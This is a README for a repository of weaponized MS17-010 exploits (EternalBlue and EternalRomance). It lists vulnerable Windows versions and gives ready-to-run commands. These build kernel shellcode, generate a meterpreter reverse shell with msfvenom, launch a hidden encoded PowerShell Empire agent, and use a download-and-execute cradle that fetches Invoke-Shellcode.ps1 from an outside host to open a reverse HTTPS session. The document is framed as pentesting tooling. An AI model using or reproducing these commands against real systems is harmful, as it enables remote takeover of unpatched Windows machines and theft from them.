# MS17-010 RCE PoC's

All credits go out to [worawit](https://github.com/worawit/MS17-010). I've just added some usage clarifications and weaponized them to be more usable for pentesting purposes.

## Eternalblue

Eternalblue only requires access to IPC$ to exploit a target while other exploits require access to a named pipe as well. Eternalblue thus works on all versions of Windows that allow anonymous access to IPC$ (Windows 7 and Windows 2008, or later version explicitly configured to allow anonymous access). Keep in mind that Eternalblue has a higher change of crashing a target than Eternalsynergy - Eternalromance, so don't try this on critical systems. 

### Compatible targets

**eternalblue_exploit7:**

- Windows 7 SP1 x64
- Windows 7 SP1 x86
- Windows Server 2008 R2 SP1 x64
- Windows Server 2008 SP1 x86

**eternalblue_exploit8:**

- Windows Server 2012 R2 x64
- Windows 8.1 x64

### Exploit usage

Example for spawning a meterpreter session on an x64 machine:

1. `nasm -f bin eternalblue_kshellcode_x64.asm`
2. `msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o meterpreter_msf.bin EXITFUNC=thread LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT>`
3. `cat eternalblue_kshellcode_x64 meterpreter_msf.bin > sc_x64.bin`
4. `python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin`


## Eternalromance

This exploit exploits the same bug used by NSA's Eternalromance (and Eternalsynergy). A named pipe is needed, meaning on more modern (default) configurations you will need credentials in order for the exploit to work. In most cases, domain user credentials will suffice. 

### Compatible targets

- Windows 2016 x64
- Windows 10 x64
- Windows 10 x86
- Windows 2012 R2 x64
- Windows 2008 R2 SP1 x64
- Windows 2008 SP1 x64
- Windows 2008 SP1 x86
- Windows 8.1 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 7 SP1 x64
- Windows 2003 SP2 x86
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows XP SP3 x86
- Windows 2000 SP4 x86

### Usage

Example for finding a named pipe (not required anymore, exploit now automatically finds a named pipe on the target):

`python find_named_pipe.py 192.168.178.2 testuser Password123`

Usage of `eternalromance.py`: 

`python eternalromance.py <target_ip_address> <username> <password> <command_to_execute>`

Example for spawning an Empire agent:

`python eternalromance.py 192.168.178.2 testuser Password123 "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAUwB0AEUAbQAuAE4AZQBUAC..."`

Example for spawning a meterpreter session:

`python eternalromance.py 192.168.178.2 testuser Password123 "powershell -Exec ByPass -NoP -noexit \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.3/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.178.3 -Lport 8443 -Force \""`

(I typically grab Invoke-Shellcode.ps1 from http://bit.ly/2cuWJTF, but that only works when the target has an unfiltered outbound connection.)
